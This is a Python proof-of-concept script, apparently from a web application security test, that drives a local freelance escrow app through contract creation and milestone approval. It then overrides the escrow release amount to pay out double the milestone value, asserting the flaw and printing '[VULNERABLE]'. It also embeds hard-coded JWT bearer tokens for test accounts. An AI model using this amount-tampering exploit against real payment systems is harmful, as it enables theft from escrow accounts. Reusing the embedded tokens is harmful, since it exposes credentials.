"""
WSTG-BUSL-02 / WSTG-BUSL-10: Escrow release amount can be overridden.
Expected: releasing $2.00 from a $1.00 milestone deducts 200 cents and credits 180.
"""
import io
import time

import requests

BASE = "http://localhost:3000"
CLIENT_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjU2NjRiN2YxLWRjNTctNGFhYy1hM2YxLTJlYzU5ZDc5MTVmOSIsImVtYWlsIjoidGVz"
    "dGNsaWVudEBoaXJlZmxvdy5jb20iLCJyb2xlIjoiY2xpZW50Iiwid2FsbGV0QmFsYW5jZSI6IjEx"
    "MDAxMDEwMjE1Nzc3MyIsImlhdCI6MTc3NDk2MTAzNywiZXhwIjoxNzc1NTY1ODM3fQ."
    "3pECPDykXAOh8VbOb0q19EcgmwsQBYWnq28wfG8AZ0o"
)
FREELANCER_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjNmY2ZiM2I0LTgzMzUtNGIxMy1iODEzLTNkNDI1YzNlY2Y3ZSIsImVtYWlsIjoidGVz"
    "dGZyZWVsYW5jZXJAaGlyZWZsb3cuY29tIiwicm9sZSI6ImZyZWVsYW5jZXIiLCJ3YWxsZXRCYWxh"
    "bmNlIjoiMTAwMDAwMDAwMDAxMzAyNzciLCJpYXQiOjE3NzQ5NjI3MjAsImV4cCI6MTc3NTU2NzUy"
    "MH0.6nRbolbwukW7iofKkQ4sr0Ky35ta41IMT1LJiHZeRp4"
)
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"

stamp = str(int(time.time()))
contract = requests.post(f"{BASE}/api/contracts", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, json={
    "freelancer_id": FREELANCER_ID,
    "title": f"WSTG override {stamp}",
    "description": "override test",
    "amount": 100,
    "milestones": [{"title": "Only milestone", "amount": 100}],
}, timeout=10).json()

mid = contract["milestones"][0]["id"]
cid = contract["id"]

requests.post(f"{BASE}/api/payments/escrow/fund/{mid}", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).raise_for_status()
requests.post(
    f"{BASE}/api/contracts/{cid}/milestones/{mid}/submit",
    headers={"Authorization": f"Bearer {FREELANCER_TOKEN}"},
    files={"files": ("note.txt", io.BytesIO(b"hello"), "text/plain")},
    data={"message": "done"},
    timeout=10,
).raise_for_status()
requests.put(f"{BASE}/api/contracts/{cid}/milestones/{mid}/approve", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).raise_for_status()

before_client = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()
before_free = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {FREELANCER_TOKEN}",
}, timeout=10).json()

release = requests.post(f"{BASE}/api/payments/escrow/release/{mid}", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, json={"amount": 2.00}, timeout=10)

after_client = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()
after_free = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {FREELANCER_TOKEN}",
}, timeout=10).json()

print("Release:", release.status_code, release.text[:180])
print("Client pending:", before_client["pending_balance"], "->", after_client["pending_balance"])
print("Freelancer balance:", before_free["balance"], "->", after_free["balance"])
assert release.status_code == 200
assert int(before_client["pending_balance"]) - int(after_client["pending_balance"]) == 200
assert int(after_free["balance"]) - int(before_free["balance"]) == 180
print("\n[VULNERABLE] Escrow release accepted an arbitrary override amount")
